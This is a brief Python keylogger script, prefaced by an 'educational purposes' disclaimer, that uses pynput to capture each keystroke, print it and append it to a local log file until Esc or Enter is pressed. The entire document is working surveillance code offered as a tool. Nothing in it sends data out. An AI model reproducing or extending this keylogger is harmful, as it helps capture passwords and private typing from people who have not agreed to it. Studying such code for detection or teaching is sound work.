#Disclaimer: The tool provided is only for educational purposes.

from pynput.keyboard import Key, Listener


def press(key):
  
    text = ""
    text = str(key).replace("'","") + text
    text = text.replace("Key.space", " ")
    text = text.replace("Key.enter", "\n")
    print(text)
    with open("C:\\Users\\user\\Documents\\Py\\logs.txt", "a") as file:
        file.write(text)



def release(key):
    if key == Key.esc:
        return False
    elif key == Key.enter:
        return False


with Listener(on_press=press, on_release=release) as Listening:
    Listening.join()


